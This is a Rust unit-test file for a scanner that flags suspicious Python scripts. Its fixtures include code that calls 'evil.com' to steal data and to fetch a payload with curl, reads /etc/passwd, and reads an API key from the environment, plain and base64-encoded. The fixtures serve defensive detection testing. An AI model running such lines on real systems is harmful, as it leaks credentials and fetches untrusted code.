// Scanner tests: scan_script detections

use super::*;

#[test]
fn test_scan_detects_blocked_domain() {
    let code = r#"import requests
r = requests.get("https://evil.com/steal")
"#;
    let findings = scan_script(code);
    assert!(findings.iter().any(|f| f.kind == "host" && f.value.contains("evil.com")));
}

#[test]
fn test_scan_detects_env_var() {
    let code = r#"import os
key = os.environ.get("OPENAI_API_KEY")
"#;
    let findings = scan_script(code);
    assert!(findings.iter().any(|f| f.kind == "env" && f.value.contains("OPENAI_API_KEY")));
}

#[test]
fn test_scan_detects_sensitive_path() {
    let code = r#"data = open("/etc/passwd").read()"#;
    let findings = scan_script(code);
    assert!(findings.iter().any(|f| f.value.contains("/etc/passwd")));
}

#[test]
fn test_scan_clean_code_no_violations() {
    let code = r#"def add(a, b):
    return a + b
print(add(1, 2))
"#;
    let findings = scan_script(code);
    let blocked = findings.iter().filter(|f| f.blocked).count();
    assert_eq!(blocked, 0);
}

#[test]
fn test_scan_detects_shell_command() {
    let code = r#"import subprocess
subprocess.run(["curl", "https://evil.com/payload"])
"#;
    let findings = scan_script(code);
    assert!(!findings.is_empty());
}

#[test]
fn test_scan_detects_base64_encoded_threat() {
    // "OPENAI_API_KEY" base64-encoded is "T1BFTkFJX0FQSV9LRVk="
    let code = r#"import base64
secret = base64.b64decode("T1BFTkFJX0FQSV9LRVk=")
"#;
    let findings = scan_script(code);
    assert!(findings.iter().any(|f| f.kind == "encoded-env" || f.kind == "suspicious"));
}

#[test]
fn test_scan_detects_dynamic_url_fstring() {
    let code = r#"
url = f"https://{host}/api/data"
"#;
    let findings = scan_script(code);
    assert!(findings.iter().any(|f| f.value.contains("dynamic URL")));
}

#[test]
fn test_scan_ignores_comments() {
    let code = r#"# import os
# os.environ.get("OPENAI_API_KEY")
x = 42
"#;
    let findings = scan_script(code);
    let blocked = findings.iter().filter(|f| f.blocked).count();
    assert_eq!(blocked, 0);
}
